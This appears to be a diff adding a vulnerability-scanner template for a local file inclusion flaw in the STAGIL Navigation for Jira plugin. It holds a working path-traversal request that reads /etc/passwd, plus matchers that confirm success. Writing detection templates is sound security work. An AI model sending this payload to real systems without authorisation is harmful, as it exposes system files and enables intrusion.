@@ -1,0 +1,30 @@
+id: stagil-navigation-jira-lfi
+info:
+  name: STAGIL Navigation for Jira Menu & Themes <2.0.52 - Local File Inclusion (LFI)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: lfi,jira
+  description: |
+    This template checks for Local File Inclusion (LFI) vulnerability in STAGIL Navigation for Jira Menu & Themes plugin versions below 2.0.52, allowing access to sensitive files like /etc/passwd.
+
+variables:
+  textMime: "text/plain"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/plugins/servlet/snjFooterNavigationConfig?fileName=../../../../etc/passwd&fileMime={{textMime}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "text/plain"
+      - type: word
+        part: body
+        words:
+          - "root:"
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0:"
